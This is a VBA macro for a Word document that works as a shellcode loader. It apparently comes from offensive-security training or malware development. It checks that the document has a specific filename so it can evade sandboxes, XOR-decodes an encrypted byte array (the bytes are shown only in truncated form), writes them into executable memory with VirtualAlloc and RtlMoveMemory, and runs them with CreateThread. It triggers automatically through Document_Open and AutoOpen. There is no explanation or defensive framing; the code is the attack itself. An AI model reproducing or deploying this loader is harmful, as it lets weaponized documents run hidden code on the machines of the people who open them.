Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long Ptr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr 
Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr


Sub MyMacro()
	Dim path As Variant
	path = Split(ActiveDocument.FullName, "\")
	If path(UBound(path)) <> "1234567890.doc" Then
	Exit Sub
	End If
	Dim buf As Variant
	Dim addr As LongPtr
	Dim counter As Long
	Dim data As Long
	Dim res As Long
	
	buf = Array(197, 217, …, 226)
	Dim key As String
	key = "916f4c31aaa35d6b867dae9a7f54270d"
	For i = 0 To UBound(buf)
	Dim it As Long
	it = (i Mod Len(key)) + 1
	buf(i) = buf(i) Xor Asc(Mid(key, it, 1))
	Next i
	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
	For counter = LBound(buf) To UBound(buf)
	data = buf(counter)
	res = RtlMoveMemory(addr + counter, data, 1)
	Next counter
	res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
MyMacro
End Sub
Sub AutoOpen()
MyMacro
End Sub
